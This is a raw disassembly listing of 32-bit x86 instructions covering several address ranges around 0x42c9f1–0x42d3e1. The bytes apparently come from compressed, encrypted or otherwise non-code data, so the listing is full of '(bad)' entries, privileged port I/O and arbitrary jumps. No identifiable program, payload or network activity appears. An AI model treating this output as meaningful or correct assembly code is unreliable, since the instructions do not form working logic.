  42c9f1:	(bad)  
  42c9f2:	pop    edi
  42c9f3:	test   al,0xb4
  42c9f5:	fstp   DWORD PTR [ebp-0x43]
  42c9f8:	enter  0xad8a,0xfc
  42c9fc:	cdq    
  42c9fd:	lds    esi,FWORD PTR [ebx+0x3b]
  42ca00:	xor    BYTE PTR [edx],al
  42ca02:	aad    0x29
  42ca04:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ca06:	iret   
  42ca07:	jecxz  0x42c998
  42ca09:	bound  ecx,QWORD PTR [eax+0x54b02172]
  42ca0f:	scas   eax,DWORD PTR es:[edi]
  42ca10:	add    DWORD PTR [esp+esi*1+0x22],edi
  42ca14:	out    dx,eax
  42ca15:	test   BYTE PTR [eax+0x75d37559],dl
  42ca1b:	fld    QWORD PTR [ecx+0x71]
  42ca1e:	cwde   
  42ca1f:	push   0xa5c6a380
  42ca24:	in     al,dx
  42ca25:	aaa    
  42ca26:	jmp    0x42ca29
  42ca28:	inc    eax
  42ca29:	and    BYTE PTR [edx+edi*1+0x1e],0x74
  42ca2e:	xor    al,0xd9
  42ca30:	scas   al,BYTE PTR es:[edi]
  42ca31:	sub    ebx,ebx
  42ca33:	(bad)  
  42ca34:	and    al,BYTE PTR [eax]
	...
  42ca96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ca97:	fimul  DWORD PTR [eax-0x10ac02bf]
  42ca9d:	(bad)  
  42ca9e:	jb     0x42cab7
  42caa0:	shr    DWORD PTR ds:0xfbf455c8,1
  42caa6:	and    eax,0x70001de
  42caab:	add    DWORD PTR [eax],eax
  42caad:	add    ch,bl
  42caaf:	mov    bl,0x45
  42cab1:	aad    0xbb
  42cab3:	xchg   edi,eax
  42cab4:	mov    ds:0x45e02c1,eax
  42cab9:	jnp    0x42ca8d
  42cabb:	xor    BYTE PTR [edi],ah
  42cabd:	adc    al,0xbc
  42cabf:	push   esp
  42cac0:	push   ecx
  42cac1:	and    esi,DWORD PTR [esi+0x1e]
  42cac4:	mov    cl,0xed
  42cac6:	cmp    DWORD PTR [eax-0x1c],ebx
  42cac9:	pop    ds
  42caca:	sti    
  42cacb:	cmp    al,0x1e
  42cacd:	push   esp
  42cace:	into   
  42cacf:	ror    DWORD PTR [eax-0x1c],1
  42cad2:	clc    
  42cad3:	imul   edi,DWORD PTR ds:0x4341e7,0xfffffffe
  42cada:	inc    esi
  42cadb:	popf   
  42cadc:	dec    ecx
  42cadd:	push   es
  42cade:	psrld  mm3,QWORD PTR [ebx-0x63]
  42cae2:	outs   dx,BYTE PTR ds:[esi]
  42cae3:	cmp    bh,bh
  42cae5:	sahf   
  42cae6:	add    eax,0xecb4f2fb
  42caeb:	in     al,0xb0
  42caed:	mov    bh,0xd6
  42caef:	fisttp QWORD PTR [ebx-0x3fdee1c4]
  42caf5:	call   0x3a2c:0xda05d1ee
  42cafc:	ds mov al,0xa9
  42caff:	sub    BYTE PTR [ebx],cl
  42cb01:	mov    bl,0x84
  42cb03:	imul   ecx,esi,0xc22a1352
  42cb09:	jo     0x42cab5
  42cb0b:	mov    eax,ds:0x596b8371
  42cb10:	test   esp,ebx
  42cb12:	ins    BYTE PTR es:[edi],dx
  42cb13:	(bad)  
  42cb14:	das    
  42cb15:	scas   al,BYTE PTR es:[edi]
  42cb16:	inc    eax
  42cb17:	ror    BYTE PTR [ebx+0x1ee63d0],cl
  42cb1d:	mov    WORD PTR [ecx+edi*8+0x42],gs
  42cb21:	dec    esp
  42cb22:	loopne 0x42cb0a
  42cb24:	or     edi,DWORD PTR [edx-0x2d0e9ec4]
  42cb2a:	fisub  DWORD PTR [eax]
  42cb2c:	sti    
  42cb2d:	sbb    DWORD PTR [ebx+0xe],0x65
  42cb31:	test   al,0x4f
  42cb33:	rol    ch,cl
  42cb35:	adc    eax,0xe045695d
  42cb3a:	test   eax,0xd7903efd
  42cb3f:	mov    al,ds:0xbd369931
  42cb44:	icebp  
  42cb45:	xchg   ebp,eax
  42cb46:	scas   al,BYTE PTR es:[edi]
  42cb47:	jg     0x42cb78
  42cb49:	lahf   
  42cb4a:	inc    ebx
  42cb4b:	mov    esi,0xa2dbb049
  42cb50:	int    0x93
  42cb52:	into   
  42cb53:	test   al,0xef
  42cb55:	adc    esi,eax
  42cb57:	imul   esi,DWORD PTR [edx+0x6a],0x82e87a90
  42cb5e:	xlat   BYTE PTR ds:[ebx]
  42cb5f:	in     al,dx
  42cb60:	popa   
  42cb61:	inc    edi
  42cb62:	fld    st(4)
  42cb64:	push   eax
  42cb65:	je     0x42cb0a
  42cb67:	in     eax,0xd
  42cb69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cb6a:	mov    eax,0xa80d45d0
  42cb6f:	and    ah,bh
  42cb71:	pop    ax
  42cb73:	push   es
  42cb74:	mov    edi,0x84cb872d
  42cb79:	out    dx,al
  42cb7a:	cmp    al,al
  42cb7c:	cld    
  42cb7d:	mov    eax,0x527995ac
  42cb82:	jno    0x42cb42
  42cb84:	mov    dl,BYTE PTR [edi+eax*2+0x5f]
  42cb88:	sbb    bl,BYTE PTR [ebx]
  42cb8a:	scas   al,BYTE PTR es:[edi]
  42cb8b:	mov    edx,0x1d6a6d2f
  42cb90:	push   es
  42cb91:	push   0x2b51926c
  42cb96:	dec    ecx
  42cb97:	retf   0x5c4
  42cb9a:	push   edx
  42cb9b:	push   eax
  42cb9c:	xor    DWORD PTR [ecx],ebx
  42cb9e:	dec    eax
  42cb9f:	mov    dl,0xb7
  42cba1:	test   eax,0xc0b3cc62
  42cba6:	outs   dx,BYTE PTR ds:[esi]
  42cba7:	push   eax
  42cba8:	adc    ebx,eax
  42cbaa:	rol    BYTE PTR [eax+esi*1],cl
  42cbad:	add    bl,BYTE PTR [eax-0x72]
  42cbb0:	and    DWORD PTR [edx],0xffffffd3
  42cbb3:	sbb    al,0x33
	...
  42cc15:	add    BYTE PTR [edi+0x2],bh
  42cc18:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42cc1c:	call   FWORD PTR [ebx]
  42cc1e:	iret   
  42cc1f:	mov    dl,0xde
  42cc21:	stc    
  42cc22:	test   DWORD PTR [eax],ecx
  42cc24:	loopne 0x42cbc7
  42cc26:	sub    al,0xdf
  42cc28:	add    DWORD PTR [eax],eax
  42cc2a:	pop    es
  42cc2b:	add    DWORD PTR [eax],eax
  42cc2d:	add    BYTE PTR [esi+0x2b],ah
  42cc30:	xchg   esi,eax
  42cc31:	aam    0xf2
  42cc33:	pop    ebx
  42cc34:	sbb    al,al
  42cc36:	addr16 push 0xffffffe5
  42cc39:	push   edi
  42cc3a:	cmp    BYTE PTR [ebx-0x3],cl
  42cc3d:	aaa    
  42cc3e:	ds xchg ebp,eax
  42cc40:	arpl   WORD PTR [ebp+0x77],bx
  42cc43:	nop
  42cc44:	out    0x6c,eax
  42cc46:	or     DWORD PTR [ecx-0x7b],esi
  42cc49:	mov    edi,0x9d2b51e0
  42cc4e:	mov    bh,0x80
  42cc50:	arpl   WORD PTR [edi+0x4c709b06],sp
  42cc56:	mov    dh,0x4b
  42cc58:	sbb    dh,BYTE PTR [edx]
  42cc5a:	fdivr  DWORD PTR [eax-0x6daac16d]
  42cc60:	call   DWORD PTR [edx+ebx*8+0x448a69ff]
  42cc67:	pop    ss
  42cc68:	jbe    0x42cc8e
  42cc6a:	fcmovnb st,st(6)
  42cc6c:	(bad)  
  42cc6d:	dec    esi
  42cc6e:	pop    es
  42cc6f:	cmp    ebp,eax
  42cc71:	and    al,0x92
  42cc73:	mov    DWORD PTR [ebx-0x4d],edx
  42cc76:	sub    DWORD PTR [edx],edx
  42cc78:	cs stos BYTE PTR es:[edi],al
  42cc7a:	jo     0x42ccea
  42cc7c:	pop    esp
  42cc7d:	mov    edi,0x8abcb496
  42cc82:	xor    al,0x90
  42cc84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cc85:	arpl   WORD PTR [esi-0x76fed32e],sp
  42cc8b:	inc    ebp
  42cc8c:	hlt    
  42cc8d:	push   ebx
  42cc8e:	push   ecx
  42cc8f:	push   es
  42cc90:	loope  0x42cc6e
  42cc92:	xchg   esp,eax
  42cc93:	mov    bl,0xf
  42cc95:	push   eax
  42cc96:	mov    ch,0x9d
  42cc98:	or     BYTE PTR [esi*4-0x3b33ab50],dl
  42cc9f:	mov    ebp,0x7a2daa5b
  42cca4:	push   ds
  42cca5:	cmc    
  42cca6:	push   ebp
  42cca7:	inc    edx
  42cca8:	adc    al,0x9
  42ccaa:	popa   
  42ccab:	rcr    BYTE PTR [eax+0x1f9fc37d],0x51
  42ccb2:	push   0x53
  42ccb4:	imul   ebx
  42ccb6:	stc    
  42ccb7:	out    0xfc,al
  42ccb9:	cld    
  42ccba:	push   ebx
  42ccbb:	retf   
  42ccbc:	add    al,0x10
  42ccbe:	pop    ds
  42ccbf:	add    eax,0x6f57a8b1
  42ccc4:	fs je  0x42ccb9
  42ccc7:	pop    esp
  42ccc8:	repz or al,0x83
  42cccb:	mov    bl,0xbe
  42cccd:	popf   
  42ccce:	jne    0x42cc82
  42ccd0:	mov    ebp,0xa8903bee
  42ccd5:	rol    BYTE PTR [ebx+0x70],1
  42ccd8:	ror    ebx,0x7f
  42ccdb:	ds cmp al,0x7b
  42ccde:	or     al,0x36
  42cce0:	loopne 0x42cced
  42cce2:	mov    ?,eax
  42cce4:	fbld   TBYTE PTR [ebx]
  42cce6:	test   eax,0xcede395
  42cceb:	and    DWORD PTR [edi],esi
  42cced:	btc    esi,ecx
  42ccf0:	jge    0x42cc9b
  42ccf2:	test   eax,0xf6026c1f
  42ccf7:	push   gs
  42ccf9:	sar    BYTE PTR [ebp+0x59],cl
  42ccfc:	out    0x3a,eax
  42ccfe:	fdiv   DWORD PTR [ebx]
  42cd00:	sbb    eax,0xbc9b5f11
  42cd05:	fdiv   DWORD PTR [esi+0x2d085e28]
  42cd0b:	in     eax,0xab
  42cd0d:	mov    cl,0xad
  42cd0f:	or     ah,BYTE PTR [eax-0x5285683e]
  42cd15:	dec    ebx
  42cd16:	jg     0x42ccd8
  42cd18:	add    al,0xe2
  42cd1a:	daa    
  42cd1b:	jbe    0x42cd56
  42cd1d:	nop
  42cd1e:	daa    
  42cd1f:	aad    0x7b
  42cd21:	fadd   st,st(1)
  42cd23:	mov    dh,0x1d
  42cd25:	sub    DWORD PTR [ebp+0x7d],ecx
  42cd28:	push   ss
  42cd29:	repz cli 
  42cd2b:	and    al,al
  42cd2d:	sahf   
  42cd2e:	(bad)  [ecx-0x391009f7]
  42cd34:	and    eax,DWORD PTR [eax]
	...
  42cd96:	sbb    DWORD PTR [ecx-0x20017802],esp
  42cd9c:	jns    0x42cd5d
  42cd9e:	in     eax,0x80
  42cda0:	(bad)  
  42cda2:	lods   al,BYTE PTR ds:[esi]
  42cda3:	xchg   esi,eax
  42cda4:	stos   DWORD PTR es:[edi],eax
  42cda5:	xchg   DWORD PTR [ebx],esi
  42cda7:	loopne 0x42cdaa
  42cda9:	add    BYTE PTR [edi],al
  42cdab:	add    DWORD PTR [eax],eax
  42cdad:	add    BYTE PTR [ecx+0x3f853f9e],cl
  42cdb3:	popf   
  42cdb4:	and    eax,0x431e3ba2
  42cdb9:	push   esp
  42cdba:	(bad)  
  42cdbb:	cld    
  42cdbc:	jo     0x42cda0
  42cdbe:	cdq    
  42cdbf:	pop    ss
  42cdc0:	mov    bh,0x2b
  42cdc2:	loope  0x42cdb9
  42cdc4:	stos   DWORD PTR es:[edi],eax
  42cdc5:	inc    ecx
  42cdc6:	js     0x42cd8d
  42cdc8:	retf   0xbd02
  42cdcb:	ret    0x148d
  42cdce:	sahf   
  42cdcf:	inc    esp
  42cdd0:	lods   eax,DWORD PTR ds:[esi]
  42cdd1:	nop
  42cdd2:	mov    dl,ah
  42cdd4:	pop    ebx
  42cdd5:	clc    
  42cdd6:	fcomp  st(7)
  42cdd8:	jne    0x42ce4f
  42cdda:	add    ch,al
  42cddc:	sbb    ah,BYTE PTR [ebp+ebp*2+0x73a660d9]
  42cde3:	xor    eax,0x55721a1e
  42cde8:	push   esp
  42cde9:	inc    edi
  42cdea:	inc    edx
  42cdeb:	cmc    
  42cdec:	fnsave [esp+edi*2-0x4f]
  42cdf0:	lea    ebx,[ecx-0x12]
  42cdf3:	in     eax,dx
  42cdf4:	push   ss
  42cdf5:	pusha  
  42cdf6:	retf   0x8e9e
  42cdf9:	jg     0x42cdab
  42cdfb:	cli    
  42cdfc:	(bad)  
  42cdfd:	adc    BYTE PTR [ecx+0x74],dh
  42ce00:	inc    ebp
  42ce01:	add    al,BYTE PTR [eax+ecx*1+0x1d8be5ad]
  42ce08:	pop    esp
  42ce09:	xchg   edi,eax
  42ce0a:	adc    DWORD PTR [eax+0x4420f498],edi
  42ce10:	sti    
  42ce11:	mov    esi,0xf2fab111
  42ce16:	ins    BYTE PTR es:[edi],dx
  42ce17:	pop    edi
  42ce18:	or     ecx,DWORD PTR [eax-0x1b576291]
  42ce1e:	enter  0x2d33,0x42
  42ce22:	jp     0x42ce37
  42ce24:	into   
  42ce25:	push   edi
  42ce27:	test   eax,0xf905bf2d
  42ce2c:	out    0x2c,eax
  42ce2e:	shl    DWORD PTR [ebx+0x58],0xe0
  42ce32:	clc    
  42ce33:	add    BYTE PTR [ebx],bl
  42ce35:	sub    BYTE PTR [ebp-0x5defd6c7],bl
  42ce3b:	popf   
  42ce3c:	fcom   DWORD PTR [edi]
  42ce3e:	jge    0x42ce65
  42ce40:	mov    dh,0x83
  42ce42:	sbb    al,0x6
  42ce44:	sub    BYTE PTR [edi],bh
  42ce46:	sar    BYTE PTR [ecx],0xe4
  42ce49:	call   0x7268efe9
  42ce4e:	sub    ah,dl
  42ce50:	xchg   ecx,eax
  42ce51:	(bad)  [edi]
  42ce53:	fidiv  WORD PTR [ebp+0x16]
  42ce56:	ret    
  42ce57:	sbb    DWORD PTR [eax+0x46c54d5],edi
  42ce5d:	inc    ebx
  42ce5e:	push   ds
  42ce5f:	push   ss
  42ce60:	and    eax,0xb410772b
  42ce65:	mov    esp,0x2a48b313
  42ce6a:	push   ebp
  42ce6b:	cmp    eax,0x27d367e7
  42ce70:	xor    DWORD PTR [ecx],esp
  42ce72:	pop    ss
  42ce73:	fidiv  DWORD PTR [esi+0x7dcc9943]
  42ce79:	inc    eax
  42ce7a:	push   0x7e5def6e
  42ce7f:	fdiv   QWORD PTR [edi-0x41]
  42ce82:	adc    BYTE PTR [ebp+edx*1+0x7a3e73ca],dl
  42ce89:	xchg   ebx,eax
  42ce8a:	dec    edx
  42ce8b:	in     al,0xa9
  42ce8d:	xor    eax,0xee6e6ce5
  42ce92:	add    al,0xdd
  42ce94:	aam    0x82
  42ce96:	leave  
  42ce97:	(bad)  [ebx-0x38d5194f]
  42ce9d:	stos   BYTE PTR es:[edi],al
  42ce9e:	loopne 0x42ce56
  42cea0:	arpl   WORD PTR [eax],bp
  42cea2:	loope  0x42ce9c
  42cea4:	jmp    0x20df3f3f
  42cea9:	mov    edx,0x409d3426
  42ceae:	outs   dx,DWORD PTR ds:[esi]
  42ceaf:	in     eax,0x48
  42ceb1:	push   0x6a345f
	...
  42cf16:	jae    0x42cf55
  42cf18:	fadd   st,st(1)
  42cf1a:	fsubrp st(5),st
  42cf1c:	jnp    0x42cedd
  42cf1e:	mov    esi,DWORD PTR [ebx-0x5b6dd2ef]
  42cf24:	inc    esi
  42cf25:	jp     0x42cf61
  42cf27:	loope  0x42cf2a
  42cf29:	add    BYTE PTR [edi],al
  42cf2b:	add    DWORD PTR [eax],eax
  42cf2d:	add    bh,bl
  42cf2f:	mov    esp,0x4a8fb022
  42cf34:	mov    ss,WORD PTR [ecx+edx*4+0x5d]
  42cf38:	sbb    esp,eax
  42cf3a:	pop    es
  42cf3b:	imul   edx,DWORD PTR [edx+0x112ddd27],0xf912f944
  42cf45:	push   ebx
  42cf46:	adc    DWORD PTR [edi],esp
  42cf48:	push   esi
  42cf49:	sub    BYTE PTR [ecx-0x24],0x59
  42cf4d:	xor    DWORD PTR [esi+edx*2],eax
  42cf50:	daa    
  42cf51:	push   cs
  42cf52:	mov    eax,ds:0xc8acb6df
  42cf57:	adc    al,0xad
  42cf59:	adc    BYTE PTR [edx+0x2a118c30],dl
  42cf5f:	fcomp  DWORD PTR ds:0x1ec89f3b
  42cf65:	adc    bl,cl
  42cf67:	enter  0xd622,0x6f
  42cf6b:	or     BYTE PTR [ebx-0x4a622759],0x9f
  42cf72:	retf   
  42cf73:	cmp    ah,bh
  42cf75:	xor    BYTE PTR [edi],dh
  42cf77:	stos   DWORD PTR es:[edi],eax
  42cf78:	jbe    0x42cf75
  42cf7a:	mov    ebx,0x687ae714
  42cf7f:	inc    ebp
  42cf80:	inc    ebp
  42cf81:	fadd   QWORD PTR [eax+0x724deaee]
  42cf87:	adc    DWORD PTR [ecx-0x4a],0xf53a26d3
  42cf8e:	sbb    eax,0x947c2498
  42cf93:	ins    DWORD PTR es:[edi],dx
  42cf94:	rol    DWORD PTR [edx+edi*1-0x3ea05ad],cl
  42cf9b:	and    al,0x7e
  42cf9d:	push   ds
  42cf9e:	jle    0x42cfe2
  42cfa0:	jecxz  0x42cfa1
  42cfa2:	pop    edi
  42cfa3:	xchg   edi,eax
  42cfa4:	lods   eax,DWORD PTR ds:[esi]
  42cfa5:	test   al,0xef
  42cfa7:	inc    ebx
  42cfa8:	mov    bl,0x5d
  42cfaa:	sub    esp,DWORD PTR [edx]
  42cfac:	xchg   ebx,eax
  42cfad:	inc    edx
  42cfae:	in     al,0x84
  42cfb0:	sbb    dh,bh
  42cfb2:	jns    0x42cfd6
  42cfb4:	imul   ebp,DWORD PTR [ecx],0xd70dc798
  42cfba:	ret    
  42cfbb:	ss and eax,0xf05caa9e
  42cfc1:	sar    DWORD PTR [edx],1
  42cfc3:	test   al,0x77
  42cfc5:	and    bh,bl
  42cfc7:	mov    cl,0x66
  42cfc9:	jg     0x42cfdf
  42cfcb:	push   esp
  42cfcc:	loopne 0x42d005
  42cfce:	jecxz  0x42cfc9
  42cfd0:	(bad)  
  42cfd1:	pop    esi
  42cfd2:	add    BYTE PTR [edx],al
  42cfd4:	dec    esp
  42cfd5:	sub    edx,DWORD PTR [eax+0x4e2808ca]
  42cfdb:	fmul   st(2),st
  42cfdd:	int    0x47
  42cfdf:	push   es
  42cfe0:	pop    esi
  42cfe1:	scas   eax,DWORD PTR es:[edi]
  42cfe2:	loop   0x42cffb
  42cfe4:	xchg   esp,eax
  42cfe5:	aam    0xd5
  42cfe7:	ficomp WORD PTR [esi]
  42cfe9:	cmp    DWORD PTR [ebx+0x74],0xffffff98
  42cfed:	sbb    ch,BYTE PTR [eax]
  42cfef:	popa   
  42cff0:	sub    edx,DWORD PTR [esi]
  42cff2:	sahf   
  42cff3:	sbb    al,0xfd
  42cff5:	(bad)  
  42cff6:	lods   eax,DWORD PTR ds:[esi]
  42cff7:	in     eax,0xb0
  42cff9:	inc    eax
  42cffa:	fs nop
  42cffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cffd:	jle    0x42d06f
  42cfff:	out    0x48,eax
  42d001:	push   cs
  42d002:	mov    ds:0x4523d767,eax
  42d007:	aas    
  42d008:	or     al,0xc1
  42d00a:	or     BYTE PTR [ebx-0x2d6fda35],0xf8
  42d011:	xor    eax,0x38262caf
  42d016:	in     eax,0x3
  42d018:	(bad)  
  42d019:	js     0x42d06c
  42d01b:	dec    edi
  42d01c:	ins    DWORD PTR es:[edi],dx
  42d01d:	cmp    BYTE PTR [eax-0x2da10a91],0x45
  42d024:	add    al,0xd
  42d026:	xor    DWORD PTR [esi],esp
  42d028:	xchg   BYTE PTR [esp+eax*8+0x48d1a36e],ah
  42d02f:	dec    eax
  42d030:	mov    ss,WORD PTR [esi]
  42d032:	stos   DWORD PTR es:[edi],eax
  42d033:	mov    eax,0x67
	...
  42d094:	add    BYTE PTR [eax],al
  42d096:	push   eax
  42d097:	cmp    al,dh
  42d099:	sub    al,0xee
  42d09b:	cld    
  42d09c:	cli    
  42d09d:	jle    0x42d0ad
  42d09f:	fmul   DWORD PTR [ebp-0xa]
  42d0a2:	loopne 0x42d0fb
  42d0a4:	sub    eax,edx
  42d0a6:	inc    ecx
  42d0a7:	loop   0x42d0aa
  42d0a9:	add    BYTE PTR [edi],al
  42d0ab:	add    DWORD PTR [eax],eax
  42d0ad:	add    BYTE PTR [eax+0x29],ch
  42d0b0:	inc    edx
  42d0b1:	inc    ecx
  42d0b2:	add    BYTE PTR [ebp-0x21259da0],bh
  42d0b8:	fbld   TBYTE PTR [eax+ebx*4-0x689d23ce]
  42d0bf:	adc    DWORD PTR [eax],ebp
  42d0c1:	xor    al,0xaa
  42d0c3:	rol    BYTE PTR [ebx+eax*8],0xf9
  42d0c7:	push   0x81d2644c
  42d0cc:	mov    ss,WORD PTR [edx]
  42d0ce:	ficom  WORD PTR [ecx+ebp*1+0xa]
  42d0d2:	cli    
  42d0d3:	arpl   WORD PTR ds:0xcdce444,bx
  42d0d9:	pop    esi
  42d0da:	test   eax,0xd90b6373
  42d0df:	retf   
  42d0e0:	sub    DWORD PTR [edi-0x1d0cd95c],eax
  42d0e6:	fidiv  WORD PTR [edi-0x1768a072]
  42d0ec:	lock sbb bh,BYTE PTR [esi]
  42d0ef:	xchg   ebx,eax
  42d0f0:	cli    
  42d0f1:	and    al,0x2d
  42d0f3:	int3   
  42d0f4:	(bad)  
  42d0f5:	lock jmp 0x42d07b
  42d0f8:	mov    WORD PTR [esi-0x2b],gs
  42d0fb:	fild   WORD PTR ds:0x77ffb649
  42d101:	mov    ecx,0x20d8b04e
  42d106:	jmp    0x8e8e:0x4ffa8e24
  42d10d:	mov    ds:0x1eec02ea,al
  42d112:	cmp    BYTE PTR [eax],ah
  42d114:	cmp    dl,al
  42d116:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d117:	jnp    0x42d0cb
  42d119:	adc    BYTE PTR [edi-0x20],dl
  42d11c:	test   BYTE PTR [ecx-0x5c2a12a6],al
  42d122:	test   al,0x64
  42d124:	fnop   
  42d126:	pusha  
  42d127:	dec    edi
  42d128:	bound  ecx,QWORD PTR [esi-0x57]
  42d12b:	jbe    0x42d15b
  42d12d:	jns    0x42d12d
  42d12f:	outs   dx,DWORD PTR ds:[esi]
  42d130:	(bad)  
  42d131:	cmp    DWORD PTR [ebp+0x11efe94],ebp
  42d137:	sbb    al,0xab
  42d139:	int3   
  42d13a:	xlat   BYTE PTR ds:[ebx]
  42d13b:	shr    BYTE PTR [eax+eax*1+0x5e],cl
  42d13f:	add    DWORD PTR [ebp+0x2c],0xffffffe0
  42d143:	sbb    BYTE PTR [ebp+0x68],bh
  42d146:	or     BYTE PTR [edx],cl
  42d148:	sti    
  42d149:	inc    esp
  42d14a:	xchg   ebp,eax
  42d14b:	scas   eax,DWORD PTR es:[edi]
  42d14c:	push   0x702e142f
  42d151:	(bad)  
  42d152:	in     eax,0x6a
  42d154:	mov    ebx,0xa1705f43
  42d159:	(bad)  
  42d15a:	imul   ebp,DWORD PTR [esi+edx*8],0x65
  42d15e:	hlt    
  42d15f:	push   es
  42d160:	popa   
  42d161:	mov    ebx,edx
  42d163:	imul   eax,DWORD PTR [eax+0x5659818f],0xc664fd80
  42d16d:	jle    0x42d199
  42d16f:	or     bl,dh
  42d171:	mov    eax,0x2d236cdc
  42d176:	dec    esp
  42d177:	pushf  
  42d178:	mov    cs,WORD PTR [ebp+0xa]
  42d17b:	lock or esi,DWORD PTR [edx-0x60]
  42d17f:	out    dx,al
  42d180:	sbb    BYTE PTR [edx+0x3d],dh
  42d183:	pop    edx
  42d184:	jne    0x42d199
  42d186:	xor    BYTE PTR [ecx+0x17adfba8],dl
  42d18c:	arpl   WORD PTR [ebx+0x59fb540a],ax
  42d192:	sub    BYTE PTR [ecx+edx*1],ch
  42d195:	pushf  
  42d196:	and    BYTE PTR [eax-0x36288638],0xff
  42d19d:	push   edi
  42d19e:	jb     0x42d151
  42d1a0:	jl     0x42d1b4
  42d1a2:	arpl   bx,bx
  42d1a4:	xor    eax,0xdb05c4f2
  42d1a9:	push   esp
  42d1aa:	sub    eax,0x6d994fa3
  42d1af:	frstor [esi]
  42d1b1:	push   ebx
  42d1b2:	adc    eax,0x9ea6
	...
  42d213:	add    BYTE PTR [eax],al
  42d215:	add    BYTE PTR [ebp-0x2289a2f8],cl
  42d21b:	ja     0x42d1cc
  42d21d:	sti    
  42d21e:	ret    
  42d21f:	or     ebx,esp
  42d221:	pop    ds
  42d222:	loop   0x42d249
  42d224:	mov    ah,0xa1
  42d226:	dec    eax
  42d227:	jecxz  0x42d22a
  42d229:	add    BYTE PTR [edi],al
  42d22b:	add    DWORD PTR [eax],eax
  42d22d:	add    BYTE PTR [esp+eax*4-0x19714aa8],bl
  42d234:	or     BYTE PTR [ecx],0xc9
  42d237:	or     DWORD PTR [edi+0x2342ada7],ebp
  42d23d:	retf   0x737
  42d240:	cli    
  42d241:	mov    al,0xe1
  42d243:	inc    esp
  42d244:	inc    eax
  42d245:	in     eax,dx
  42d246:	sbb    esp,DWORD PTR [eax-0x42]
  42d249:	fsubr  DWORD PTR [esi+0x27b812e1]
  42d24f:	mov    esp,0x3030681c
  42d254:	addr16 std 
  42d256:	(bad)  
  42d257:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d259:	xlat   BYTE PTR ds:[ebx]
  42d25a:	adc    edi,esp
  42d25c:	dec    esi
  42d25d:	jb     0x42d1f0
  42d25f:	call   0x3641ba
  42d264:	test   BYTE PTR [ebp*1+0x2b5a7bfb],bl
  42d26b:	add    eax,0xb0acf1bd
  42d270:	inc    edi
  42d271:	cld    
  42d272:	or     al,0xe5
  42d274:	mov    edx,0x78dd9ba
  42d279:	adc    DWORD PTR [esi],ecx
  42d27b:	cdq    
  42d27c:	cwde   
  42d27d:	call   0xb5c6:0x4d7c8c38
  42d284:	lods   eax,DWORD PTR ds:[esi]
  42d285:	sub    BYTE PTR ds:0x4029c963,cl
  42d28b:	jecxz  0x42d218
  42d28d:	clc    
  42d28e:	fmul   st(5),st
  42d290:	mov    ecx,0x19d12634
  42d295:	scas   al,BYTE PTR es:[edi]
  42d296:	jne    0x42d2cf
  42d298:	pop    eax
  42d299:	mov    ecx,0x1dc7c18c
  42d29e:	cmp    DWORD PTR [edx+0x67],ecx
  42d2a1:	fucomi st,st(6)
  42d2a3:	loopne 0x42d2d0
  42d2a5:	int    0x54
  42d2a7:	pop    ss
  42d2a8:	mov    esi,DWORD PTR [ebp+edi*1-0x3fd172cf]
  42d2af:	out    0x69,eax
  42d2b1:	sub    eax,0x75d7c6e8
  42d2b6:	test   DWORD PTR [edx+0x12],0x3d98206b
  42d2bd:	xchg   ecx,eax
  42d2be:	ficomp WORD PTR [edx-0x4ee9653f]
  42d2c4:	out    0xd,eax
  42d2c6:	xor    al,0xa5
  42d2c8:	or     eax,0x385c4d50
  42d2cd:	into   
  42d2ce:	sub    dl,ah
  42d2d0:	adc    ch,BYTE PTR [edi+ebx*4]
  42d2d3:	xchg   ebx,eax
  42d2d4:	mov    edx,0x4b4a45aa
  42d2d9:	retf   0x7c9c
  42d2dc:	popf   
  42d2dd:	mov    DWORD PTR [esi],0x854cfb48
  42d2e3:	daa    
  42d2e4:	adc    cl,BYTE PTR [esi-0x5c]
  42d2e7:	inc    esi
  42d2e8:	push   eax
  42d2e9:	cmp    eax,0x470b0b44
  42d2ee:	mov    ds:0xa0647041,al
  42d2f3:	lea    ebx,[edx+0x109ab482]
  42d2f9:	xchg   DWORD PTR [esi],esp
  42d2fb:	or     DWORD PTR [edx],0x903d54ae
  42d301:	mov    ds:0x299326d7,al
  42d306:	bound  ecx,QWORD PTR [ebx+0x1d00da31]
  42d30c:	in     al,0xd3
  42d30e:	dec    ecx
  42d30f:	sub    BYTE PTR [esi+0x21cbe640],cl
  42d315:	(bad)  
  42d316:	clc    
  42d317:	jl     0x42d32e
  42d319:	dec    esi
  42d31a:	or     eax,0xad9b1f8e
  42d31f:	dec    ecx
  42d321:	test   esi,eax
  42d323:	push   ebp
  42d324:	(bad)  
  42d325:	mov    ebx,0x32b84f9c
  42d32a:	cmp    esi,edx
  42d32c:	inc    esi
  42d32d:	(bad)  
  42d32f:	dec    edx
  42d330:	aam    0x55
  42d332:	out    dx,eax
  42d333:	xor    edx,DWORD PTR [edi+0x0]
	...
  42d395:	add    cl,al
  42d397:	into   
  42d398:	arpl   WORD PTR [ecx-0x21044291],bx
  42d39e:	cmp    BYTE PTR [esp+ecx*8+0x35970858],bl
  42d3a5:	stc    
  42d3a6:	dec    edi
  42d3a7:	in     al,0x1
  42d3a9:	add    BYTE PTR [edi],al
  42d3ab:	add    DWORD PTR [eax],eax
  42d3ad:	add    BYTE PTR [esi-0x8],ah
  42d3b0:	adc    cl,bh
  42d3b2:	sar    ecx,1
  42d3b4:	fucomi st,st(7)
  42d3b6:	hlt    
  42d3b7:	mov    ds:0xd9b959f1,eax
  42d3bc:	inc    ebp
  42d3bd:	addr16 pop es
  42d3bf:	ret    
  42d3c0:	lods   eax,DWORD PTR ds:[esi]
  42d3c1:	cli    
  42d3c2:	repz dec ebp
  42d3c4:	dec    ebx
  42d3c5:	aas    
  42d3c6:	pop    eax
  42d3c7:	or     ch,al
  42d3c9:	inc    ebx
  42d3ca:	add    ecx,esi
  42d3cc:	stc    
  42d3cd:	cmp    al,0x95
  42d3cf:	jne    0x42d377
  42d3d1:	test   ch,bh
  42d3d3:	mov    bh,0x37
  42d3d5:	mov    esi,0xc3642ab8
  42d3da:	mov    ebx,0xeb27b5e1
  42d3df:	std    
  42d3e0:	into   
  42d3e1:	jns    0x42d379
